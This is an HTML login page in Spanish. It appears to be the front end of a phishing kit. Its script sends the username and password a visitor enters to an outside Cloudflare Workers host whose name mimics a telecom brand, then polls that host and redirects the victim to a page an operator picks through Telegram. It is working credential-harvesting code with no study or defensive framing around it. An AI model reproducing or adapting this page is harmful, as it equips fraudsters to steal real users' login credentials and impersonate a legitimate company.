<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>Formulario de Login</h2>

  <form id="loginForm">
    <label>Usuario: <input type="text" name="usuario" required></label><br><br>
    <label>Clave: <input type="password" name="clave" required></label><br><br>
    <button type="submit">Enviar</button>
  </form>

  <p id="estado"></p>

  <script>
    const BASE_URL = "https://blue-night-7897.claropromoxlaro.workers.dev";

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const form = e.target;
      const transactionId = crypto.randomUUID();

      const datos = {
        usuario: form.usuario.value,
        clave: form.clave.value,
        transactionId
      };

      try {
        const res = await fetch(BASE_URL + "/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(datos)
        });
        const json = await res.json();
        if (!json.ok) throw new Error("Error en el envío");

        document.getElementById("estado").textContent = "✅ Esperando respuesta...";

        // --- Esperar la opción elegida desde Telegram ---
        const interval = setInterval(async () => {
          const r = await fetch(`${BASE_URL}/status?id=${transactionId}`);
          const status = await r.json();

          if (status && status.opcionElegida) {
            clearInterval(interval);
            window.location.href = status.opcionElegida + ".html";
          }
        }, 2000);

      } catch (err) {
        document.getElementById("estado").textContent = "❌ Error: " + err.message;
      }
    });
  </script>
</body>
</html>
